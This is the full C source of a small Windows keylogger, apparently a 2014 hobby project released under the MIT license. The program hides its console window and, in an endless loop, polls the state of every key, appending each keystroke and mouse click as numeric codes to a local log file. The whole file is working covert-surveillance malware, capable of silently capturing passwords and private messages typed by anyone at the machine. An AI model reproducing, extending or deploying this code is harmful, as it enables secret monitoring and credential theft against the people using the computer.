/**
* Developer: Minhas Kamal (minhaskamal024@gmail.com)
* Date: 15.Aug.2014
* Website: https://minhaskamal.github.io/StupidKeylogger
* License: MIT License
* Intro: Logs all key strokes and mouse clicks. Also adds date time on every PC start.
*        I spent a whole day doing this little code. But it was really fun!
**/

#include <stdio.h>
#include <windows.h>
#include <time.h>

// output file name
#define FILE_NAME "Record.log"

main(){
    // hides the console window
    FreeConsole();

    // open or create a file
    FILE *file = fopen(FILE_NAME, "a");
    
    // writing date-time; & an extra '0' before every start which is used during decoding
    time_t date = time(NULL);
    fprintf(file, "0\n%s\t", ctime(&date)); 
    fclose(file);

    unsigned short ch, i;
    while(1){ //infinite loop
        
        ch=1;
        while(ch<250){ //scans for 0-249 ASCII craracters
            
            // this strange and extra loop helps in sensing fast-keystrokes with 
            // minimum processor use
            for(i=0; i<50; i++, ch++){
                
                //when key is stroke
                if(GetAsyncKeyState(ch) == -32767){
                    
                    //append the ASCII code of the character
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            
            // this 1ms sleep inhibits the program from occupying full processor
            Sleep(1);
        }
    }
    
}
